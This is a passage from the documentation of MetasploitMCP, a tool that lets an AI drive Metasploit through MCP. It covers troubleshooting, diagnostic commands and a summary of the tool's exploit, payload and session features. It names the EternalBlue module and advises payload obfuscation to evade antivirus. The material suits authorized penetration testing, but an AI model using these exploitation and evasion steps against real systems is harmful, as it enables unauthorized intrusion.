"exploit/windows/smb/ms17_010_eternalblue"
# Not just "ms17_010"
```

#### Issue: "Session closed immediately"
**Cause**: Incompatible payload or detected by AV  
**Solution**:
- Try different payload
- Use encoding/obfuscation
- Disable AV in testing environment
- Check firewall rules

#### Issue: "Exploit completed but no session"
**Cause**: Target not vulnerable or handler not ready  
**Solution**:
1. Run check module first
2. Start handler before exploit
3. Verify payload compatibility
4. Check LHOST/LPORT are correct

### Diagnostic Commands

```bash
# Check service status
./manage-services.sh status

# View MCP logs
tail -f /tmp/metasploitmcp.log

# View msfrpcd logs
ssh metasploit-mcp 'tail -f /tmp/msfrpcd.log'

# Test Python connection
cd /home/twain/Project/MetasploitMCP
source venv/bin/activate
python3 -c "
from dotenv import load_dotenv
load_dotenv('.env.local')
from pymetasploit3.msfrpc import MsfRpcClient
import os
client = MsfRpcClient(
    password=os.getenv('MSF_PASSWORD'),
    server=os.getenv('MSF_SERVER'),
    port=int(os.getenv('MSF_PORT')),
    ssl=os.getenv('MSF_SSL').lower() == 'true'
)
print('Connected:', client.core.version)
"

# Check active sessions
list_active_sessions()

# Check active jobs
list_listeners()
```

### Getting Help

1. **Documentation**
   - `SETUP_VERIFICATION.md` - Setup guide
   - `README.md` - Project overview
   - `MSFRPCD_MANAGEMENT.md` - msfrpcd reference

2. **Log Files**
   - `/tmp/metasploitmcp.log` - MCP server logs
   - `/tmp/msfrpcd.log` - msfrpcd logs (on remote)

3. **Management Script**
   - `./manage-services.sh --help` - Usage guide
   - `./manage-services.sh status` - Quick health check

4. **Community Resources**
   - Metasploit Documentation
   - MCP Protocol Specification
   - GitHub Issues

---

## Summary

MetasploitMCP provides **13 powerful tools** organized into 6 categories:

| Category | Tools | Purpose |
|----------|-------|---------|
| **Discovery** | 2 | Find exploits and payloads |
| **Exploitation** | 3 | Run exploits and modules |
| **Payloads** | 1 | Generate executable payloads |
| **Sessions** | 3 | Manage active connections |
| **Handlers** | 3 | Control listeners and jobs |
| **AI Analysis** | 3 | Get AI-powered insights |

**Key Features**:
- ✅ 2,565 exploits available
- ✅ 1,675 payloads available
- ✅ Natural language interface via AI
- ✅ Real-time session management
- ✅ AI-powered analysis and guidance
- ✅ Full Metasploit Framework integration

**Remember**:
- Always get authorization
- Test in isolated environments
- Document your work
- Clean up after testing
- Use responsibly and ethically

---

*Last Updated: October 18, 2025*  
*MetasploitMCP Version: 1.6.0*  
*Metasploit Framework: 6.4.95-dev*
